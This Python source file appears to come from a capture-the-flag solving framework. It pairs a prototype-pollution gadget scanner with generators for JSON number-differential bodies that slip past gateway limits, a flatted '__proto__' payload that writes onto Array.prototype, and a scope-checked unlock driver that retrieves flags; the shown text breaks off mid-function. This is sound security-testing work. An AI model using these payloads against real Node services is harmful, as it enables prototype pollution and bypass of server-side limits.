#!/usr/bin/env python3
"""Prototype-pollution gadget scanner + JSON number-differential engine (B-047).

Two offline, plan-only halves, plus one deterministic live driver that sends
only through a caller-supplied transport and only to a URL the event's
live-service scope allows (``ctf.scope.check_url`` runs before every send).

1. **Static PP-gadget scanner** (``scan_pp_gadgets``).  The existing web engines
   generate prototype-pollution *payloads* (``clientside_exploit``), scan
   client-side gadgets (``client_side_depth``) and model the server-side
   source->sink bridge from already-proven facts (``webdepth_node_sspp_planner``).
   None of them answers the first question an operator has about a downloaded
   Node bundle: *does this code contain a merge/assign sink that will write
   through ``__proto__``, and is it guarded?*  This scanner reads supplied
   JavaScript as inert text and classifies the known gadget families --
   ``flatted``/``flat`` unflatten, ``lodash.merge`` / ``defaultsDeep`` /
   ``_.set``, ``jQuery.extend(true, ...)`` and hand-rolled recursive ``for..in``
   assign loops -- recording for each whether the code guards the three
   dangerous keys (``__proto__``, ``constructor``, ``prototype``).  Guards are
   searched only inside the sink's enclosing ``{...}`` block (its function or
   loop body), and ``hasOwnProperty`` / ``Object.create(null)`` are weak hints
   that never clear a key: ``JSON.parse`` makes ``"__proto__"`` an *own* key, so
   an ``if (s.hasOwnProperty(k))`` merge still pollutes.  For a ``flatted``
   sink, ``flatted_proto_payload`` builds the ``"__proto__"``-reference wire
   body (the reference resolves to ``Array.prototype`` in flatted's resolver,
   modelled by ``flatted_resolve_model``).  No JavaScript is executed.

2. **JSON number-differential model** (``number_differential_variants``,
   ``detect_number_differentials``).  Modelled next to ``parser_differential``
   (whose duplicate-key detector this module reuses) and ``rest_schema_abuse``:
   a body whose numeric value a validating *gateway* and a *Node backend* read
   differently, so a limit check at the edge passes while the backend acts on a
   larger number.  The reader behaviours are concrete pure functions
   (``read_number_strict_json``, ``read_number_float64``,
   ``read_number_int_regex`` and the duplicate-key resolvers), so every
   generated differential is checked by construction rather than asserted.

3. **Unlock driver** (``build_unlock_body``, ``build_unlock_token``,
   ``extract_unlock_input``, ``drive_unlock``).  Once the gadget, the number
   differential and the unlock format are known the exploit is deterministic:
   post the differential body; when the backend answers with an
   ``unlock_input`` (e.g. ``cutover|<batch>|<value>``), hash it
   (``sha256_hex`` by default) and resend the same body with ``unlock=<hex>``;
   lift the payoff (the event's flag or proof format, ``ctf.flagfmt``) from the
   response.  There is no default network transport: the driver sends nothing
   unless the caller hands it one, and the tests hand it a fake bound to
   127.0.0.1.

Untrusted-data rule: every input string is data.  Nothing read from an artifact or
a response is evaluated, imported, or executed.
"""
from __future__ import annotations

import bisect
import hashlib
import json
import re
import sys
from dataclasses import dataclass
from decimal import Decimal, InvalidOperation
from pathlib import Path
from typing import Any, Callable, Iterable, Sequence

try:  # the checkout root is on sys.path under the engine runner; be robust to direct import too
    from ctf import flagfmt, scope
    from ctf.result import Cost, Evidence, SolverResult
except ModuleNotFoundError:  # pragma: no cover - exercised only outside the engine sys.path
    sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
    from ctf import flagfmt, scope
    from ctf.result import Cost, Evidence, SolverResult

_HERE = Path(__file__).resolve().parent
if str(_HERE) not in sys.path:  # flat sibling imports, as the engine boot and the suite lay them out
    sys.path.insert(0, str(_HERE))

import parser_differential as _pd  # noqa: E402 -- the shared duplicate-key detector


ENGINE_ID = "web.pp_number_differential"

MAX_SOURCE_BYTES = 4 * 1024 * 1024
MAX_BODY_BYTES = 1 * 1024 * 1024
DANGEROUS_KEYS = ("__proto__", "constructor", "prototype")


class NumberDiffError(ValueError):
    """Malformed or over-limit input to the number-differential model."""


# --------------------------------------------------------------------------
# Part 1: static prototype-pollution gadget scanner
# --------------------------------------------------------------------------

# Each family: (name, call-site regex, inherently_unsafe).  An inherently unsafe
# family writes attacker keys through to the target on its own; the others are
# hints whose verdict comes from the code they lead to.
_GADGET_FAMILIES: tuple[tuple[str, str, bool], ...] = (
    # flatted/flat rebuild an object graph from attacker JSON; flatted's resolver
    # turns a "__proto__" reference into Array.prototype (flatted_resolve_model).
    ("flatted_parse", r"\b(?:flatted|flat|Flatted)\s*\.\s*(?:parse|unflatten)\s*\(", True),
    ("unflatten", r"\bunflatten\s*\(", True),
    # lodash deep writers
    ("lodash_merge", r"\b_\.\s*(?:merge|mergeWith)\s*\(", True),
    ("lodash_defaultsdeep", r"\b_\.\s*defaultsDeep\s*\(", True),
    ("lodash_set", r"\b_\.\s*(?:set|setWith)\s*\(", True),
    ("lodash_zipobjectdeep", r"\b_\.\s*zipObjectDeep\s*\(", True),
    # jQuery deep extend
    ("jquery_deep_extend", r"\$\.extend\s*\(\s*true\s*,", True),
    # A call to a named deep-merge helper is a hint, not a verdict: when the
    # helper is in the bundle its own for..in loop is scanned and judged.
    ("named_deep_merge", r"\b(?:deepMerge|deepAssign|mergeDeep|recursiveMerge|extendDeep)\s*\(", False),
)
_INHERENTLY_UNSAFE = {name: unsafe for name, _rx, unsafe in _GADGET_FAMILIES}
_INHERENTLY_UNSAFE["recursive_forin_assign"] = True

# A hand-rolled copy loop: `for (<k> in <src>) ... target[<k>] = ...`.
_FORIN_ASSIGN_RE = re.compile(
    r"for\s*\(\s*(?:const|let|var)?\s*([A-Za-z_$][\w$]*)\s+in\s+[A-Za-z_$][\w$]*\s*\)"
    r"[\s\S]{0,400}?\[\s*\1\s*\]\s*=(?!=)",
)

# A function declaration of the matched name (`function deepMerge(`) is not a call site.
_DECL_BEFORE_RE = re.compile(r"\bfunction\s*\*?\s*$")


def _key_guard_res(key: str) -> tuple[re.Pattern[str], ...]:
    q = re.escape(key)
    return (
        re.compile(r"[!=]==?\s*['\"]" + q + r"['\"]"),                     # k === '__proto__'
        re.compile(r"['\"]" + q + r"['\"]\s*[!=]==?"),                     # '__proto__' !== k
        re.compile(r"\[[^\]]{0,120}['\"]" + q + r"['\"][^\]]{0,120}\]\s*\)?\s*\.\s*(?:includes|indexOf|has)\s*\("),
        re.compile(r"/[^/\n]{0,120}\b" + q + r"\b[^/\n]{0,120}/[a-z]*\s*\.\s*test\s*\("),  # /^(__proto__|..)$/.test(k)
    )


# Guards that clear a dangerous key at a call site.
_GUARD_RES: dict[str, tuple[re.Pattern[str], ...]] = {k: _key_guard_res(k) for k in DANGEROUS_KEYS}
_GUARD_RES["__proto__"] += (re.compile(r"Object\.freeze\s*\(\s*Object\.prototype\s*\)"),)

# Weak hints: reported, never a guard.  `hasOwnProperty` does not stop pollution
# (JSON.parse creates "__proto__" as an own key of the source), and
# `Object.create(null)` protects only the object it creates, which a text scan
# cannot tie to the merge target.
_WEAK_HINT_RES: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("hasOwnProperty", re.compile(r"hasOwnProperty\s*\(|Object\.hasOwn\s*\(")),
    ("Object.create(null)", re.compile(r"Object\.create\s*\(\s*null\s*\)")),
)

_SCAN_INTERESTING = re.compile(r"[\"'`{}/]")


def _blank(chars: list[str], lo: int, hi: int) -> None:
    """Overwrite ``chars[lo:hi]`` with spaces (offsets stay aligned with the
    original text; line numbers are always counted on the original)."""
    hi = min(hi, len(chars))
    chars[lo:hi] = " " * (hi - lo)


def _lex(source: str) -> tuple[str, list[int], list[int]]:
    """One pass over ``source``: a masked copy plus its ``{...}`` blocks.

    The masked copy has the same length as ``source``.  Comments
    are blanked whole; a string or template literal keeps its quotes but its body
    is blanked, unless the body is exactly one of :data:`DANGEROUS_KEYS` (so a
    real guard such as ``k === '__proto__'`` still reads as one, while a guard or
    a call site inside a comment or inside a longer string does not).

    Blocks come back as parallel (opens, closes) lists sorted by open offset; an
    unclosed block runs to the end.  A textual approximation (regex literals are
    not recognised), good enough to keep a guard scan inside its own function."""
    chars = list(source)
    spans: list[tuple[int, int]] = []
    stack: list[int] = []
    n = len(source)
    i = 0
    while True:
        m = _SCAN_INTERESTING.search(source, i)
        if m is None:
            break
        i = m.start()
        c = source[i]
        if c in "\"'`":
            j = i + 1
            while j < n and source[j] != c:
                if source[j] == "\\":
                    j += 2
                    continue
                if c != "`" and source[j] == "\n":
                    break
                j += 1
            if source[i + 1:j] not in DANGEROUS_KEYS:
                _blank(chars, i + 1, j)
            i = j + 1
            continue
        if c == "/" and i + 1 < n and source[i + 1] in "/*":
            if source[i + 1] == "/":
                j = source.find("\n", i)
                end = n if j < 0 else j
            else:
                j = source.find("*/", i + 2)
                end = n if j < 0 else j + 2
            _blank(chars, i, end)
            i = end
            continue
        if c == "{":
            stack.append(i)
        elif c == "}" and stack:
            spans.append((stack.pop(), i))
        i += 1
    spans.extend((o, n) for o in stack)
    spans.sort()
    return "".join(chars), [o for o, _c in spans], [c for _o, c in spans]


def _enclosing_block(opens: list[int], closes: list[int], pos: int) -> tuple[int, int] | None:
    """The innermost ``{...}`` block that contains ``pos``, or None at top level."""
    idx = bisect.bisect_left(opens, pos) - 1
    while idx >= 0:
        if closes[idx] >= pos:
            return opens[idx], closes[idx]
        idx -= 1
    return None


def _window(source: str, pos: int, block: tuple[int, int] | None, *,
            before: int = 400, after: int = 600) -> str:
    """The guard-search window of a sink at ``pos``: ``before`` chars ahead of it
    and ``after`` chars past it, clipped to the sink's enclosing block."""
    lo, hi = max(0, pos - before), pos + after
    if block is not None:
        lo, hi = max(lo, block[0]), min(hi, block[1] + 1)
    return source[lo:hi]


def _guarded_keys(window: str) -> list[str]:
    """Which dangerous keys this call site visibly guards against."""
    return [key for key in DANGEROUS_KEYS if any(rx.search(window) for rx in _GUARD_RES[key])]


def _weak_hints(window: str) -> list[str]:
    return [name for name, rx in _WEAK_HINT_RES if rx.search(window)]


def scan_pp_gadgets(source: str) -> list[dict[str, Any]]:
    """Classify prototype-pollution merge/assign sinks in supplied JavaScript.

    ``source`` is treated as inert text.  Returns one finding per detected call
    site, deterministically ordered by source offset::

        {"family", "offset", "line", "evidence", "guarded", "unguarded_keys",
         "weak_hints", "inherently_unsafe", "exploitable_without_guard"}

    ``unguarded_keys`` is the subset of ``("__proto__", "constructor",
    "prototype")`` with no visible guard in the sink's own block.
    ``exploitable_without_guard`` is true for an inherently unsafe family with an
    unguarded key: the operator's "this bundle has a reachable PP sink" signal.
    ``weak_hints`` (``hasOwnProperty``, ``Object.create(null)``) never clear a key.
    """
    if not isinstance(source, str):
        raise NumberDiffError("source must be text")
    if len(source.encode("utf-8", "surrogatepass")) > MAX_SOURCE_BYTES:
        raise NumberDiffError(f"source exceeds {MAX_SOURCE_BYTES} bytes")

    # Every match runs over the masked copy, so a call site or a guard inside a
    # comment or a string literal is neither a sink nor a guard.  Evidence is
    # quoted from the original text at the same offsets.
    masked, opens, closes = _lex(source)
    hits: list[tuple[int, str, str]] = []  # (offset, family, evidence)
    for name, pattern, _unsafe in _GADGET_FAMILIES:
        for m in re.finditer(pattern, masked):
            if _DECL_BEFORE_RE.search(masked, max(0, m.start() - 24), m.start()):
                continue  # `function deepMerge(` declares, it does not call
            hits.append((m.start(), name, source[m.start():m.end()][:120]))
    for m in _FORIN_ASSIGN_RE.finditer(masked):
        hits.append((m.start(), "recursive_forin_assign",
                     source[m.start():m.end()][:120].replace("\n", " ")))
    if not hits:
        return []

    hits.sort(key=lambda t: (t[0], t[1]))
    findings: list[dict[str, Any]] = []
    for offset, family, evidence in hits:
        window = _window(masked, offset, _enclosing_block(opens, closes, offset))
        guarded = _guarded_keys(window)
        unguarded = [k for k in DANGEROUS_KEYS if k not in guarded]
        unsafe = _INHERENTLY_UNSAFE[family]
        findings.append({
            "family": family,
            "offset": offset,
            "line": source.count("\n", 0, offset) + 1,
            "evidence": evidence,
            "guarded": guarded,
            "unguarded_keys": unguarded,
            "weak_hints": _weak_hints(window),
            "inherently_unsafe": unsafe,
            "exploitable_without_guard": unsafe and bool(unguarded),
        })
    return findings


class _JsRef:
    """A non-JSON value a flatted reference resolves to (repr names it)."""

    __slots__ = ("name",)

    def __init__(self, name: str):
        self.name = name

    def __repr__(self) -> str:
        return self.name


ARRAY_PROTOTYPE = _JsRef("Array.prototype")
ARRAY_CONSTRUCTOR = _JsRef("Array")
_UNDEFINED = _JsRef("undefined")


def flatted_proto_payload(target_field: str, source_field: str, props: dict[str, Any]) -> str:
    """The flatted wire body that makes ``manifest[target_field]`` resolve to
    ``Array.prototype`` and ``manifest[source_field]`` to ``props``.

    In flatted's format every string in a record is a reference: ``"1"`` points
    at array entry 1, and the resolver's ``input[value]`` turns the literal
    reference ``"__proto__"`` into ``Array.prototype``.  A later
    ``merge(manifest[target_field], manifest[source_field])`` then writes
    ``props`` onto ``Array.prototype``.  ``props`` values must be non-strings
    (a string would itself be read as a reference)."""
    for name, v in (("target_field", target_field), ("source_field", source_field)):
        if not isinstance(v, str) or not v:
            raise NumberDiffError(f"{name} must be a non-empty string")
    if target_field == source_field:
        raise NumberDiffError("target_field and source_field must differ")
    if not isinstance(props, dict) or not props:
        raise NumberDiffError("props must be a non-empty dict")
    if any(isinstance(v, str) for v in props.values()):
        raise NumberDiffError("props values must not be strings: flatted reads a string as a reference")
    root = {target_field: "__proto__", source_field: "1"}
    return json.dumps([root, props], separators=(",", ":"))


def flatted_resolve_model(text: str) -> Any:
    """Model flatted 3.x ``parse``: resolve each string reference in the records
    against the parsed array, as ``input[value]`` does in JavaScript.  A digit
    index resolves to that entry (revived in turn); ``"__proto__"`` resolves to
    :data:`ARRAY_PROTOTYPE`, ``"constructor"`` to :data:`ARRAY_CONSTRUCTOR`; any
    other reference is ``undefined``.  Returns the revived root."""
    try:
        arr = json.loads(text)
    except json.JSONDecodeError as exc:
        raise NumberDiffError(f"not flatted JSON: {exc}") from exc
    if not isinstance(arr, list) or not arr:
        raise NumberDiffError("flatted wire body must be a non-empty JSON array")
    revived: dict[int, Any] = {}

    def ref(value: str) -> Any:
        if value == "__proto__":
            return ARRAY_PROTOTYPE
        if value == "constructor":
            return ARRAY_CONSTRUCTOR
        if value.isdigit() and int(value) < len(arr):
            return entry(int(value))
        return _UNDEFINED

    def entry(i: int) -> Any:
        if i in revived:
            return revived[i]
        raw = arr[i]
        if isinstance(raw, dict):
            out: dict[str, Any] = {}
            revived[i] = out
            for k, v in raw.items():
                out[k] = ref(v) if isinstance(v, str) else v
            return out
        if isinstance(raw, list):
            outl: list[Any] = []
            revived[i] = outl
            outl.extend(ref(v) if isinstance(v, str) else v for v in raw)
            return outl
        revived[i] = raw  # a primitive entry (the string table) is its own value
        return raw

    return entry(0)


# --------------------------------------------------------------------------
# Part 2: JSON number-differential model
# --------------------------------------------------------------------------

# JSON.parse number grammar (RFC 8259): optional minus, int with no leading zero,
# optional frac, optional exp.  This is the Node backend's reader.
_JSON_NUMBER_RE = re.compile(r"-?(?:0|[1-9][0-9]*)(?:\.[0-9]+)?(?:[eE][+-]?[0-9]+)?")
_STRICT_JSON_NUMBER_FULL = re.compile(r"\A" + _JSON_NUMBER_RE.pattern + r"\Z")
_INT_REGEX_FULL = re.compile(r"\A-?[0-9]+\Z")


def read_number_strict_json(token: str) -> int | float:
    """Model a strict RFC-8259 ``JSON.parse`` number reader (the Node backend).

    An integer token with no fraction/exponent yields a Python ``int`` (JSON.parse
    keeps integer values exact up to IEEE-754 range, but we keep arbitrary
    precision so the *differential* against a float64 reader is visible).  Anything
    else yields a ``float``.  Raises :class:`NumberDiffError` on a token outside
    the JSON number grammar (e.g. ``1e3`` is fine, ``0x10``/``+5``/``01`` are not).
    """
    if not isinstance(token, str) or _STRICT_JSON_NUMBER_FULL.match(token) is None:
        raise NumberDiffError(f"not a JSON number token: {token!r}")
    if re.search(r"[.eE]", token):
        return float(token)
    return int(token)


def read_number_float64(token: str) -> float:
    """Model a reader that always yields an IEEE-754 double (a JS ``Number(...)``
    style gateway).  Large integers lose precision here; that loss against
    :func:`read_number_strict_json` is the classic number differential."""
    if not isinstance(token, str) or not token:
        raise NumberDiffError("token must be non-empty text")
    try:
        return float(token)
    except ValueError as exc:
        raise NumberDiffError(f"not a float token: {token!r}") from exc


def read_number_int_regex(token: str) -> int | None:
    """Model an integer-only gateway validator (`type: integer`, ``^-?\\d+$``).

    Returns the integer, or ``None`` when the token is not a bare integer — the
    gateway would reject, defer or coerce it (e.g. sci-notation ``1e3`` is *not*
    an integer here, while the backend's JSON.parse reads it as ``1000``)."""
    if not isinstance(token, str):
        raise NumberDiffError("token must be text")
    if _INT_REGEX_FULL.match(token) is None:
        return None
    return int(token)


def _resolve_pairs(pairs: Sequence[tuple[str, Any]], key: str, *, last_wins: bool) -> Any:
    """First-wins / last-wins resolution of a duplicate key in an ordered body."""
    found: Any = _MISSING
    for k, v in pairs:
        if k == key:
            found = v
            if not last_wins:
                break
    if found is _MISSING:
        raise NumberDiffError(f"key {key!r} not present")
    return found


_MISSING = object()


def duplicate_key_body(key: str, first_value: Any, second_value: Any,
                       *, other: Sequence[tuple[str, Any]] = ()) -> str:
    """Raw JSON body with ``key`` present twice.  A first-wins parser reads
    ``first_value``; a last-wins parser (Python/Node ``JSON.parse``) reads
    ``second_value``.  Built with ``parser_differential.dual_key_json`` (json.dumps
    would collapse the duplicate)."""
    if not isinstance(key, str):
        raise NumberDiffError("key must be a string")
    try:
        return _pd.dual_key_json([*map(tuple, other), (key, first_value), (key, second_value)])
    except ValueError as exc:
        raise NumberDiffError(str(exc)) from exc


@dataclass(frozen=True)
class NumberVariant:
    mechanism: str
    body: str                 # raw JSON body to send
    gateway_reads: Any        # what the limiting gateway sees for `key`
    backend_reads: Any        # what the Node backend sees for `key`
    note: str


def _raw_number_body(key: str, raw_token: str, *, other: Sequence[tuple[str, Any]]) -> str:
    """Body with ``key`` set to a raw (possibly non-canonical) numeric token."""
    parts = [json.dumps(k) + ":" + json.dumps(v) for k, v in other]
    parts.append(json.dumps(key) + ":" + raw_token)
    return "{" + ",".join(parts) + "}"


def number_differential_variants(
    key: str,
    *,
    gateway_limit: int,
    unlock_value: int,
    other: Sequence[tuple[str, Any]] = (),
) -> list[NumberVariant]:
    """Candidate bodies where the gateway reads ``<= gateway_limit`` for ``key``
    (or defers a non-integer lexeme) while the Node backend reads
    ``unlock_value`` (``> gateway_limit``).  ``other`` adds the request's other
    fields, in order, ahead of ``key``.

    Every returned variant is verified by construction: the gateway reading is
    computed with the matching gateway model and the backend reading with
    :func:`read_number_strict_json`/duplicate resolution.  Raises
    :class:`NumberDiffError` if no mechanism can satisfy the caller's values.
    """
    if not isinstance(key, str) or not key:
        raise NumberDiffError("key must be a non-empty string")
    if not isinstance(gateway_limit, int) or isinstance(gateway_limit, bool):
        raise NumberDiffError("gateway_limit must be an int")
    if not isinstance(unlock_value, int) or isinstance(unlock_value, bool):
        raise NumberDiffError("unlock_value must be an int")
    if unlock_value <= gateway_limit:
        raise NumberDiffError("unlock_value must exceed gateway_limit for a differential")

    out: list[NumberVariant] = []

    # (a) Duplicate key: gateway reads the first occurrence, backend the last.
    dup_body = duplicate_key_body(key, gateway_limit, unlock_value, other=other)
    pairs = _body_pairs(dup_body)
    g = _resolve_pairs(pairs, key, last_wins=False)
    b = _resolve_pairs(pairs, key, last_wins=True)
    if g == gateway_limit and b == unlock_value:
        out.append(NumberVariant(
            "duplicate_key", dup_body, g, b,
            "gateway keeps the first duplicate key, Node JSON.parse keeps the last",
        ))

    # (b) Scientific notation: an integer-regex gateway rejects/defers it, the
    #     backend's JSON.parse reads the full value.
    sci = _as_sci_notation(unlock_value)
    if sci is not None:
        body = _raw_number_body(key, sci, other=other)
        gw = read_number_int_regex(sci)  # None -> gateway does not screen it as an integer
        be = read_number_strict_json(sci)
        if gw is None and be == unlock_value:
            out.append(NumberVariant(
                "sci_notation", body, None, be,
                "an integer-only gateway rejects/defers the '1e3' form; Node reads it as the full number",
            ))

    # (c) Float64 precision loss: a float64 gateway rounds a 2^53+ integer into
    #     the limit window, the backend reads it exact.
    if unlock_value > 2 ** 53:
        token = str(unlock_value)
        rounded = int(read_number_float64(token))
        if rounded != unlock_value and rounded <= gateway_limit:
            body = _raw_number_body(key, token, other=other)
            out.append(NumberVariant(
                "float64_precision", body, rounded, unlock_value,
                "float64 gateway rounds the 2^53+ integer; a big-int/decimal-exact backend keeps it",
            ))

    if not out:
        raise NumberDiffError(
            "no modelled mechanism satisfies these values; try a larger unlock_value "
            "or a mechanism-specific builder"
        )
    return out


def _as_sci_notation(value: int) -> str | None:
    """`value` as a minimal `<mantissa>e<exp>` JSON number, or None if it has no
    clean exact form."""
    if value == 0:
        return "0e0"
    sign = "-" if value < 0 else ""
    mag = abs(value)
    exp = 0
    while mag % 10 == 0 and mag > 0:
        mag //= 10
        exp += 1
    if exp == 0:
        # still a valid differential: e.g. 123 -> 1.23e2
        digits = str(mag)
        if len(digits) < 2:
            return None
        return f"{sign}{digits[0]}.{digits[1:]}e{len(digits) - 1}"
    return f"{sign}{mag}e{exp}"


def _body_pairs(text: str) -> list[tuple[str, Any]]:
    def hook(pairs: list[tuple[str, Any]]) -> list[tuple[str, Any]]:
        return pairs
    try:
        root = json.loads(text, object_pairs_hook=hook)
    except json.JSONDecodeError as exc:
        raise NumberDiffError(f"not JSON: {exc}") from exc
    if not isinstance(root, list):
        raise NumberDiffError("top-level JSON value is not an object")
    return root


class _Pairs(list):
    """An object parsed with its ordered (key, value) pairs, duplicates kept."""


def _pointer_nodes(root: Any, pointer: str) -> list[_Pairs]:
    """Every object node a parser_differential JSON pointer names (a duplicated
    parent key yields one node per duplicate)."""
    nodes: list[Any] = [root]
    if pointer not in ("", "/"):
        for raw in pointer.split("/")[1:]:
            seg = raw.replace("~1", "/").replace("~0", "~")
            nxt: list[Any] = []
            for node in nodes:
                if isinstance(node, _Pairs):
                    nxt.extend(v for k, v in node if k == seg)
                elif isinstance(node, list) and seg.isdigit() and int(seg) < len(node):
                    nxt.append(node[int(seg)])
            nodes = nxt
    return [n for n in nodes if isinstance(n, _Pairs)]


def _is_number(v: Any) -> bool:
    return isinstance(v, (int, float)) and not isinstance(v, bool)


_MAX_SCI_EXP = 400  # beyond this a token is +/-Infinity or 0 in float64 anyway


def detect_number_differentials(text: str) -> list[dict[str, Any]]:
    """Static detector over a raw JSON body: numeric values a gateway and a Node
    backend read differently.  Number tokens are taken from the parser itself, so
    digits inside strings are never mistaken for numbers.

    Returns ``[{"kind", ...}]`` with ``kind`` one of:

    * ``float64_precision`` -- an integer token whose float64 reading differs from
      its exact value (``{"token", "exact", "float64"}``).
    * ``sci_notation`` -- an integer-valued exponent token such as ``359e5``: an
      integer-only gateway does not read it as an integer (``int_gateway`` is
      ``None``), while ``JSON.parse`` yields the full value
      (``{"token", "exact", "float64", "int_gateway"}``).
    * ``duplicate_key`` -- a key present more than once at one object level with
      differing values, at least one a number (``{"path", "key", "values",
      "first_wins", "last_wins"}``).  Detection is
      ``parser_differential.detect_duplicate_case_keys`` (exact duplicates); a
      duplicate with no numeric value is that engine's report, not this one's.

    Raises :class:`NumberDiffError` on text that is not JSON.
    """
    if not isinstance(text, str):
        raise NumberDiffError("text must be a string")
    if len(text.encode("utf-8", "surrogatepass")) > MAX_BODY_BYTES:
        raise NumberDiffError(f"body exceeds {MAX_BODY_BYTES} bytes")

    int_tokens: list[str] = []
    float_tokens: list[str] = []

    def p_int(s: str) -> int:
        int_tokens.append(s)
        return int(s)

    def p_float(s: str) -> float:
        float_tokens.append(s)
        return float(s)

    try:
        root = json.loads(text, object_pairs_hook=_Pairs, parse_int=p_int, parse_float=p_float)
    except ValueError as exc:  # JSONDecodeError, or an int over Python's digit limit
        raise NumberDiffError(f"not JSON: {exc}") from exc

    findings: list[dict[str, Any]] = []

    seen: set[tuple[str, str]] = set()
    for dup in _pd.detect_duplicate_case_keys(text):
        if dup["kind"] != "exact-duplicate":
            continue
        key, path = dup["keys"][0], dup["path"]
        if (path, key) in seen:
            continue
        seen.add((path, key))
        for node in _pointer_nodes(root, path):
            vals = [v for k, v in node if k == key]
            if len(vals) < 2 or not any(_is_number(v) for v in vals):
                continue
            if all(v == vals[0] and type(v) is type(vals[0]) for v in vals):
                continue
            findings.append({
                "kind": "duplicate_key",
                "path": path,
                "key": key,
                "values": [_scalar(v) for v in vals],
                "first_wins": _scalar(vals[0]),
                "last_wins": _scalar(vals[-1]),
            })
            break

    for token in dict.fromkeys(int_tokens):
        exact = int(token)
        f64 = float(token)
        if f64 in (float("inf"), float("-inf")) or int(f64) != exact:
            findings.append({"kind": "float64_precision", "token": token, "exact": exact, "float64": f64})

    for token in dict.fromkeys(float_tokens):
        if "e" not in token and "E" not in token:
            continue
        try:
            d = Decimal(token)
        except InvalidOperation:  # pragma: no cover - the JSON grammar already holds
            continue
        if abs(d.adjusted()) > _MAX_SCI_EXP or d != d.to_integral_value():
            continue
        findings.append({
            "kind": "sci_notation",
            "token": token,
            "exact": int(d),
            "float64": float(token),
            "int_gateway": read_number_int_regex(token),
        })
    return findings


def _scalar(v: Any) -> Any:
    return v if isinstance(v, (int, float, str, bool)) or v is None else "<nested>"


# --------------------------------------------------------------------------
# Part 3: unlock-token builder and live driver
# --------------------------------------------------------------------------

# A transport sends one request and returns (status, headers, body-bytes).
Transport = Callable[[str, bytes, dict], "tuple[int, dict, bytes]"]


def build_unlock_body(variant: NumberVariant | str) -> bytes:
    """The raw bytes to POST for a chosen :class:`NumberVariant` (or a raw JSON
    object body the caller already built)."""
    if isinstance(variant, NumberVariant):
        return variant.body.encode("utf-8")
    if isinstance(variant, str):
        _require_object_body(variant)
        return variant.encode("utf-8")
    raise NumberDiffError("variant must be a NumberVariant or a raw JSON object body")


def _require_object_body(body: str) -> str:
    t = body.strip()
    if not (t.startswith("{") and t.endswith("}")):
        raise NumberDiffError("request body must be a JSON object ({...})")
    return t


def build_unlock_token(unlock_input: str | Sequence[Any], *, algo: str = "sha256", sep: str = "|") -> str:
    """Hex digest of an unlock input: ``sha256_hex("cutover|<batch>|<value>")``.

    ``unlock_input`` is the server-issued string, or its parts (joined with
    ``sep``, each part ``str()``-ed: ``["cutover", "MRN-1", 35900000]``)."""
    if isinstance(unlock_input, str):
        text = unlock_input
    elif isinstance(unlock_input, Sequence) and unlock_input:
        text = sep.join(str(p) for p in unlock_input)
    else:
        raise NumberDiffError("unlock_input must be a string or a non-empty sequence of parts")
    if not text:
        raise NumberDiffError("unlock_input is empty")
    if algo not in hashlib.algorithms_guaranteed or algo.startswith("shake"):
        raise NumberDiffError(f"unsupported unlock digest {algo!r}")
    return hashlib.new(algo, text.encode("utf-8")).hexdigest()


def extract_unlock_input(response_text: str, field: str = "unlock_input") -> str | None:
    """The server-issued unlock input from a response: the first string value of
    ``field`` at any depth of a JSON response, or a ``"field":"..."`` pair in a
    non-JSON one.  None when absent."""
    try:
        doc = json.loads(response_text)
    except (json.JSONDecodeError, TypeError):
        doc = _MISSING
    if doc is not _MISSING:
        stack = [doc]
        while stack:
            node = stack.pop(0)
            if isinstance(node, dict):
                v = node.get(field)
                if isinstance(v, str) and v:
                    return v
                stack.extend(node.values())
            elif isinstance(node, list):
                stack.extend(node)
        return None
    m = re.search(r'"' + re.escape(field) + r'"\s*:\s*("(?:[^"\\\n]|\\.){1,1024}")', response_text)
    if m is None:
        return None
    try:
        v = json.loads(m.group(1))
    except json.JSONDecodeError:
        return None
    return v or None


def with_body_field(body: str, field: str, value: Any) -> str:
    """Append ``"field": value`` to a raw JSON object body without re-serialising
    it, so the number lexeme (``359e5``) and any duplicate keys survive."""
    t = _require_object_body(body)
    inner = t[1:-1].strip()
    pair = json.dumps(field) + ":" + json.dumps(value)
    return "{" + (inner + "," if inner else "") + pair + "}"


def _payoff(text: str, profile: Any, token_pattern: re.Pattern[str] | None) -> str | None:
    """The first payoff token in ``text``: ``token_pattern`` when the caller gives
    one, else the event's proof (when it defines one) or flag format, never a
    CSS-shaped ``word{prop:value}`` match."""
    if token_pattern is not None:
        m = token_pattern.search(text)
        return m.group(0) if m else None
    ff = flagfmt.for_profile(profile) if profile is not None else flagfmt.current()
    if ff.proof is not None:
        proofs = ff.find_proofs(text)
        if proofs:
            return proofs[0]
    for tok in ff.find_flags(text):
        if ff.known or not flagfmt.css_like(tok):
            return tok
    return None


def _send(transport: Transport, url: str, body: bytes, hdrs: dict[str, str]) -> tuple[int, str]:
    status, _resp_headers, resp_body = transport(url, body, dict(hdrs))
    if not isinstance(status, int):
        raise NumberDiffError("transport must return an int status")
    text = resp_body.decode("utf-8", "replace") if isinstance(resp_body, (bytes, bytearray)) else str(resp_body)
    return status, text


def drive_unlock(
    url: str,
    variant: NumberVariant | str,
    *,
    transport: Transport,
    profile: Any = None,
    headers: dict[str, str] | None = None,
    token_pattern: re.Pattern[str] | None = None,
    unlock_input_field: str = "unlock_input",
    unlock_field: str = "unlock",
    algo: str = "sha256",
) -> dict[str, Any]:
    """Deterministically drive one differential body to the payoff, in at most two steps.

    1. ``url`` is checked against the event's live-service scope
       (``ctf.scope.check_url``; :class:`ctf.scope.OutOfScope` is raised before
       anything is sent), then the body is posted.
    2. If the response carries no payoff but an ``unlock_input_field`` (e.g.
       ``422 {"unlock_input": "cutover|MRN-1|35900000"}``), the same body is
       resent with ``unlock_field = <algo>_hex(unlock_input)``.

    ``transport`` is required and is the only thing that touches a socket; it is
    called as ``transport(url, body_bytes, headers) -> (status, headers,
    body_bytes)``.  ``profile`` is the event profile (scope and payoff format);
    None means the pinned scope profile and ``ctf.flagfmt.current()``.  The
    payoff is matched with ``token_pattern`` when given, else the event format.

    Returns ``{"status", "token", "response", "mechanism", "sent_bytes",
    "unlock_input", "unlock", "steps"}``; ``token`` is None when no payoff came
    back.
    """
    if not callable(transport):
        raise NumberDiffError("transport must be callable; the driver never opens its own socket")
    if not isinstance(url, str) or not url:
        raise NumberDiffError("url must be a non-empty string")
    scope.check_url(url, what="pp_number_differential.drive_unlock", profile=profile)
    body = build_unlock_body(variant)
    hdrs = {"Content-Type": "application/json"}
    if headers:
        hdrs.update(headers)

    steps: list[dict[str, Any]] = []
